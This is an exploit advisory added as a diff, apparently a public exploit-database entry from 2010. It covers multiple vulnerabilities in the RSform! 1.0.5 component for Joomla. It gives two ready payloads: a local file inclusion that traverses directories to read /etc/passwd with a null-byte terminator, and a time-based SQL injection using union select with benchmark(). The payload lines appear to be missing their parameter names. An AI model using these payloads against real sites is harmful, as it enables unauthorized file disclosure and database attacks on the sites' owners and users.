@@ -1,0 +1,21 @@
+# Exploit Title: RSform! 1.0.5 (Joomla) Multiple Vulnerabilities
+# Date: 06.11.2010
+# Author: jdc
+# Software Link: 
+http://extensions.joomla.org/extensions/contacts-and-feedback/forms/2265
+# Version: 1.0.5
+
+Local File Include
+------------------
+?option=com_forme
+?=../../../../../../../../../etc/passwd%00
+
+SQL Injection
+-------------
+?option=com_forme
+?=-1' union select benchmark(1000000,md5(1)) -- '
+
+NOTE: RSform! Pro is not affected...
+
+6 Nov 2010
+jdc
